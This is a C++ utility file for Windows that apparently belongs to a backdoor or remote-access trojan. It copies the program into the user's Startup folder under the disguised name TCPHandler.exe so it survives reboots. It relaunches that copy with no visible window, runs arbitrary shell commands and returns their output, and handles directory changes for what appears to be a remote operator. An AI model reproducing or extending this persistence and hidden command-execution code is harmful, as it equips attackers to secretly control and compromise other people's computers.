#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Utils.h"
#include <string>

std::string startUpPath = std::string(getenv("APPDATA")) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\TCPHandler.exe";

uint32_t getPrivateIP()
{
    char hostName[255];
    char* localIP;
    struct hostent* host_entry;

    gethostname(hostName, 255);
    host_entry = gethostbyname(hostName);
    return (*(struct in_addr*)*host_entry->h_addr_list).s_addr;
}

bool isInStartUp(char* filePath)
{
    std::string fileName, startUpFileName;

    fileName = std::string(filePath).substr(std::string(filePath).find_last_of("\\"));
    startUpFileName = startUpPath.substr(startUpPath.find_last_of("\\"));

    /*checking if the files' names are the same*/
    return fileName._Equal(startUpFileName);
}

void copyToStartUp(char* filePath)
{
    std::string command = "copy " + std::string(filePath) + " \"" + startUpPath + "\"";
    executeShell((char*)command.c_str());
}

void executeStartUpFile()
{
    // additional information
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // set the size of the structures
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    // start the program up
    if(!CreateProcessA
    (
        startUpPath.c_str(),   // the path
        NULL,                // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NO_WINDOW | NORMAL_PRIORITY_CLASS,     // Opens file with no console
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi           // Pointer to PROCESS_INFORMATION structure
    ))
        return;
    //WaitForSingleObject(pi.hProcess, INFINITE);
    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

std::string executeShell(char* cmd) 
{
    std::string cd = std::string(cmd).substr(0, 2);
    if (cd._Equal("cd"))
    {
        switchDir((char*)std::string(cmd).substr(2).c_str());
        return "";
    }
    std::array<char, 128> buffer;
    std::string result;
    /*i create a pointer to a "file"*/
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);    

    /*check for errors*/
    if (!pipe)
        throw std::runtime_error("popen() failed!");
    
    /*getting the output of the command*/
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) // I read the data from the buffer 
        result += buffer.data();
   
    return result;
}

void switchDir(char* arg)
{
    std::string subFolderPath;
    WCHAR moduleFilePath[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, moduleFilePath);

    char modulePath[MAX_PATH];
    wcstombs(modulePath, moduleFilePath, MAX_PATH);

    std::cout << modulePath << std::endl;
    // Find the backslash in front of the name the last directory.
    std::string::size_type pos = std::string(modulePath).find_last_of("\\");

    if (!strcmp(arg, "..") || !strcmp(arg, " .."))
        // Removing the last directory
        subFolderPath = std::string(modulePath).substr(0, pos);

    else
        //adding the name of the folder
        subFolderPath = std::string(modulePath) + "\\" + &arg[1];

    std::cout << subFolderPath << std::endl;

    WCHAR subPath[MAX_PATH];
    mbstowcs(subPath, subFolderPath.c_str(), subFolderPath.size() + 1);

    if (_wchdir(subPath))
        std::cout << "Set dir error <" << GetLastError() << ">" << std::endl;;
}

